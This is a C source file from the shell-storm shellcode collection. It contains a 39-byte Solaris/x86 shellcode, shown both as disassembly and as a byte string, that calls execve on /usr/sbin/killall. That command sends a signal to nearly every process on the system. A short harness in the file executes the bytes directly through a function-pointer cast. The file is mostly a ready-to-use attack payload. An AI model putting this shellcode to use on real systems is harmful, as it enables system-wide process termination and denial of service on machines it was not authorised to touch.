/*
 Title:   Solaris/x86 - SystemV killall command - 39 bytes
 Author:  Jonathan Salwan <submit AT shell-storm.org>
 Web:     http://www.shell-storm.org
 Twitter: http://twitter.com/jonathansalwan

 ! Database of shellcodes: http://www.shell-storm.org/shellcode/

 Date:    2010-06-03
 Tested:  SunOS opensolaris 5.11 snv_111b i86pc i386 i86pc Solaris

   killall5 is the SystemV killall command. It sends a signal to all processes
   except the processes in its own session, so it won't kill the shell that is
   running the script it was called from. Its primary (only) use is in the rc
   scripts found in the /etc/init.d directory.


 section .text
    0x8048074:              31 c0              xorl   %eax,%eax
    0x8048076:              50                 pushl  %eax
    0x8048077:              6a 6c              pushl  $0x6c
    0x8048079:              68 6c 6c 61 6c     pushl  $0x6c616c6c
    0x804807e:              68 6e 2f 6b 69     pushl  $0x696b2f6e
    0x8048083:              68 2f 73 62 69     pushl  $0x6962732f
    0x8048088:              68 2f 75 73 72     pushl  $0x7273752f
    0x804808d:              89 e3              movl   %esp,%ebx
    0x804808f:              50                 pushl  %eax
    0x8048090:              53                 pushl  %ebx
    0x8048091:              89 e2              movl   %esp,%edx
    0x8048093:              50                 pushl  %eax
    0x8048094:              52                 pushl  %edx
    0x8048095:              53                 pushl  %ebx
    0x8048096:              b0 3b              movb   $0x3b,%al
    0x8048098:              50                 pushl  %eax
    0x8048099:              cd 91              int    $0x91

*/

#include <stdio.h>

char sc[] = "\x31\xc0\x50\x6a\x6c\x68\x6c\x6c\x61\x6c"
            "\x68\x6e\x2f\x6b\x69\x68\x2f\x73\x62\x69"
            "\x68\x2f\x75\x73\x72\x89\xe3\x50\x53\x89"
            "\xe2\x50\x52\x53\xb0\x3b\x50\xcd\x91";

int main(void)
{
        fprintf(stdout,"Length: %d\n",strlen(sc));
        (*(void(*)()) sc)();

return 0;
}